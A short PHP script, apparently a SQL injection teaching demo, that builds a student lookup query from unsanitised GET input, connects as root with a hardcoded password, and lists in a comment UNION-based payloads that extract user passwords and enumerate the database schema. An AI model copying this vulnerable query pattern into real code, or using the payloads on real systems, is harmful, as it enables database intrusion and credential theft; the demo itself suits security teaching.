<?php

$mysqli = new mysqli('localhost', 'root', '1111', 'stud3');

$query = "SELECT `id`, `lastname`, `firstname` FROM `students` WHERE `lastname` = '".$_GET['name']."'";

echo "Query to be executed: ".$query."<hr>";
$startTime = microtime(true);

$res = $mysqli->query($query);

$endTime = microtime(true);

// Calculate query execution time
$executionTime = ($endTime - $startTime );

echo " Execution time of script = ".$executionTime." sec<br>";

if( $res === false ) {
    die('No students found<br>');
}
if( $res->num_rows ) {
    $data = $res->fetch_all(MYSQLI_ASSOC);
    echo "students data: <br><pre>";  print_r($data); echo "";
}
else {
    echo "No students found<br>";
}

/*
 * possible age values - from example:
25' ORDER BY 1 #
25' ORDER BY 4 #
30' UNION SELECT uid as id, `username` as lastname, `password` as firstname FROM `users` ORDER BY id #
30' UNION SELECT table_name, 1, 2 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() #
30' UNION SELECT `COLUMN_NAME`, `ORDINAL_POSITION`, `DATA_TYPE` FROM INFORMATION_SCHEMA.`COLUMNS` WHERE `TABLE_SCHEMA`=database() AND `TABLE_NAME` LIKE 'users' #
*/